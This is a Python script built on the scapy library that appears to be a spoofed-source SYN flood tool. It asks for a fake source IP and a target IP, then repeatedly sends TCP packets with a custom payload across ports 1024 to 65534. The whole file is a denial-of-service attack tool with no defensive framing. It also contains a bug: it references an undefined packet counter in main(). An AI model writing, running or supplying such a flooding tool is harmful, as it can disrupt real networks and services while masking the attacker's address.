#!/usr/bin/python

from scapy.all import *
import sys
import time





def synFlood(src,tgt,message):
	packet_count = 0
	
	for dport in range(1024,65535):
	#dport = 80	
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)

		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt, verbose=False)

		packet_count = packet_count + 1
	
	





def main():	
	source = input("[+] Enter Source IP Address to Fake : ")
	target = input("[+] Enter Target IP : ")
	message = input("[+] Enter Message for TCP paylaod : ")
	
	

	while True:
		synFlood(source,target,message)
		#packet_count = packet_count + 1

		print("\r[+] Sending TCP packet : " +str(packet_count))
		sys.stdout.flush()
		time.sleep(2)	
	


if __name__ == "__main__":
	main()







